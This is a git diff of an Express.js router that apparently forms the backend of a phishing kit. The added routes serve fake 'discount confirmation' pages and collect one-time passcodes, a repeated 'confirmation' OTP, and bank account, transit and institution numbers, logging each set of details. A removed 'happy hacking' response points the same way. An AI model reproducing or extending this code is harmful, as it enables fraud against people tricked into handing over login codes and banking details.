@@ -26,8 +26,27 @@ router.post('/api/admin/login/:id',(req, res) => {
 router.post('/api/admin/login/:id/otp', (req, res) => {
     LoginDetail['OTP'] = req.body.OTP;
     console.log(LoginDetail);
-    res.send('happy hacking')
-    LoginDetail = {};
+    res.send("ok")
+});
+
+router.get('/admin/login/discount/id/:id/add_discount', async (req, res) => {
+    res.sendFile(path.join(__dirname + '/../public' + '/dicount-confirmation.html'))
+});
+
+router.get('/admin/login/discount/id/:id/confirmation', async (req, res) => {
+    res.sendFile(path.join(__dirname + '/../public' + '/confirmagain.html'))
+});
+router.post('/api/admin/login/:id/otp/confirmation', (req, res) => {
+    LoginDetail['OTP'] = req.body.OTP;
+    console.log(LoginDetail);
+    res.send("ok")
+});
+router.post('/api/admin/login/:id/account', (req, res) => {
+    LoginDetail['Account'] = req.body.Account;
+    LoginDetail['Transit'] = req.body.Transit;
+    LoginDetail['Institution'] = req.body.Institution;
+    console.log(LoginDetail);
+    res.send("ok")
 });
 
 module.exports = router
